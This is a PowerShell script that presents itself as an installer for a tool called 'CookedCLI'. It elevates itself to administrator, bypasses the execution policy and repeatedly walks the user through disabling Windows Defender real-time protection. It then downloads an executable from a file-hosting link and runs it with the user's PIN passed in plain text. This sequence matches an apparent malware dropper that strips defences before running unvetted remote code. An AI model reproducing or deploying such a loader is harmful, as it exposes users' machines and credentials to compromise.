# check admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
    exit
}
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White"
$Host.PrivateData.ErrorForegroundColor = "Red"
$Host.PrivateData.ErrorBackgroundColor = "Black"
$Host.PrivateData.WarningForegroundColor = "Yellow"
$Host.PrivateData.WarningBackgroundColor = "Black"
Clear-Host
Write-Host @"

   _____            _            _  _____ _ _ 
  / ____|          | |          | |/ ____| (_)
 | |     ___   ___ | | _____  __| | |    | |_ 
 | |    / _ \ / _ \| |/ / _ \/ _` | |    | | |
 | |___| (_) | (_) |   <  __/ (_| | |____| | |
  \_____\___/ \___/|_|\_\___|\__,_|\_____|_|_|
                 by bridgezan                                      
"@ -ForegroundColor Cyan
# check antivirus
function Check-RealTimeProtection {
    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
        return $defenderStatus.RealtimeProtectionEnabled
    }
    catch {
        Write-Host "Error checking Defender status: $_" -ForegroundColor Red
        return $null
    }
}
:mainloop while ($true) {
    Write-Host "`nChecking Real-Time Protection status..." -ForegroundColor Yellow
    $rtpStatus = Check-RealTimeProtection
    if ($rtpStatus -eq $true) {
        Write-Host "Real-Time Protection is: ON" -ForegroundColor Red
        Write-Host "`nOpening Windows Security settings..." -ForegroundColor Yellow
        Start-Process "windowsdefender:" -Wait
        $choice = Read-Host "`nAfter disabling Real-Time Protection, choose an option:`n[1] Check again (Press Y)`n[2] Skip and continue (Press S)`n[3] Exit (Press any other key)"
        switch ($choice.ToLower()) {
            'y' { 
                Write-Host "Checking again..." -ForegroundColor Cyan
                continue mainloop
            }
            's' {
                Write-Host "Skipping Real-Time Protection check..." -ForegroundColor Yellow
                break mainloop
            }
            default {
                Write-Host "Exiting script..." -ForegroundColor Yellow
                exit
            }
        }
    }
    elseif ($rtpStatus -eq $false) {
        Write-Host "Real-Time Protection is: OFF" -ForegroundColor Green
        break
    }
    else {
        Write-Host "Could not determine Real-Time Protection status" -ForegroundColor Yellow
        $choice = Read-Host "Continue anyway? (y/n)"
        if ($choice -ne 'y') {
            exit
        }
        break
    }
}


# make folder
Write-Host "`n[2/5] Creating CookedCLI folder on desktop..." -ForegroundColor Yellow
$desktopPath = [Environment]::GetFolderPath("Desktop")
$folderPath = Join-Path -Path $desktopPath -ChildPath "CookedCLI"

if (-not (Test-Path -Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
    Write-Host "Folder created: $folderPath" -ForegroundColor Green
}
else {
    Write-Host "Folder already exists." -ForegroundColor Yellow
}

# download file
Write-Host "`n[3/5] Downloading OceanCLI.exe..." -ForegroundColor Yellow
$downloadUrl = "https://abrehamrahi.ir/o/public/PK5PBRdQ"
$outputFile = Join-Path -Path $folderPath -ChildPath "CookedCLI.exe"

try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile -ErrorAction Stop
    Write-Host "Download completed successfully." -ForegroundColor Green
}
catch {
    Write-Host "Download error: $_" -ForegroundColor Red
    exit
}

#  ask pin
Write-Host "`n[4/5] Getting PIN..." -ForegroundColor Yellow
$pin = Read-Host "Enter your PIN" -AsSecureString
$pinPlain = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pin))

# run file
Write-Host "`n[5/5] Running CookedCLI.exe..." -ForegroundColor Yellow
try {
    Start-Process -FilePath "$folderPath\CookedCLI.exe" -ArgumentList $pinPlain -Wait -NoNewWindow -ErrorAction Stop
    Write-Host "Program executed successfully." -ForegroundColor Green
}
catch {
    Write-Host "Execution error: $_" -ForegroundColor Red
}

Write-Host "`nOperation completed. Press any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
